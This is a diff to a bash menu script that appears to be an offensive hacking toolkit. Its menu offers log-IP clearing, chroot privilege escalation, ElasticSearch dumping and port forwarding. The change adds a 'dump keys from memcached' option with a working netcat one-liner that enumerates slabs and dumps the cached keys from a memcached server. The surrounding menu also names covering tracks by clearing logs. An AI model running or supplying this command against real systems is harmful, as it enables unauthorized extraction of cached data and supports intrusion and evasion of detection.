@@ -105,7 +105,7 @@ while true; do
 	echo -ne " 142. clear IP from logs\t\t\t\t143. socat port forward\t\t\t\t144. sudo -l\n"
 	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
 	echo -ne " 148. view history\t\t\t\t\t\t161. Privesc with chroot\t\t\t\t\n"
-	echo -ne " 168. search keywords inside files in specific folder\n"
+	echo -ne " 168. search keywords inside files in specific folder\t\t\t\t\t169. dump keys from memcached\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -672,6 +672,9 @@ while true; do
 				fi
 			fi
 		fi
+	;;
+	"169")
+		echo 'stats items' | nc localhost 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
 	;;
 	*)
 		echo "error, invalid choice"
